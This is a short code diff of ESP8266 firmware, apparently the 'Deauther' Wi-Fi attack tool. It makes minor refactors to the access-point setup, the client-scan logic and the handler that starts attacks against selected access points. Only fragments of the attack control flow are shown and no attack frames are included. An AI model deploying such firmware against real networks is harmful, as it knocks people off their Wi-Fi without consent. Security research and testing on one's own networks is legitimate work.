@@ -16,6 +16,7 @@ extern "C" {
 
 const static char *ssid = "pwned";
 const static char *password = "deauther"; //must have at least 8 characters
+const bool debug = true;
 
 ESP8266WebServer server(80);
 
@@ -36,6 +37,7 @@ void sniffer(uint8_t *buf, uint16_t len){
 }
 
 void startWifi(){
+  Serial.println("starting WiFi AP");
   WiFi.mode(WIFI_STA);
   wifi_set_promiscuous_rx_cb(sniffer);
   WiFi.softAP(ssid, password); //for an open network without a password change to:  WiFi.softAP(ssid);
@@ -62,7 +64,7 @@ void setup(){
   Serial.println("starting...");
 
   startWifi();
-  attack.generate(-1);
+  attack.generate();
 
   /* ========== Web Server ========== */
 
@@ -94,9 +96,7 @@ void setup(){
 
 void loop(){
   if(clientScan.sniffing){
-    if(clientScan.stop()){
-      startWifi();
-    }
+    if(clientScan.stop()) startWifi();
   } else{
     server.handleClient();
     attack.run();
@@ -130,7 +130,7 @@ void selectAP(){
 
 //==========Client-Scan==========
 void startClientScan(){
-  if(server.hasArg("time") && apScan.selected > -1 && !clientScan.sniffing) {
+  if(server.hasArg("time") && apScan.getFirstTarget() > -1 && !clientScan.sniffing) {
     server.send(200, "text/json", "true");
     clientScan.start(server.arg("time").toInt());
     attack.stop(0);
@@ -160,9 +160,9 @@ void sendAttackInfo(){ server.send ( 200, "text/json", attack.getResults()); }
 void startAttack(){
   if(server.hasArg("num")) {
     int _attackNum = server.arg("num").toInt();
-    if(apScan.selected > -1 || _attackNum == 3){
+    if(apScan.getFirstTarget() > -1 || _attackNum == 2){
       attack.start(server.arg("num").toInt());
       server.send ( 200, "text/json", "true");
-    }
+    }else server.send ( 200, "text/json", "false");
   }
 }
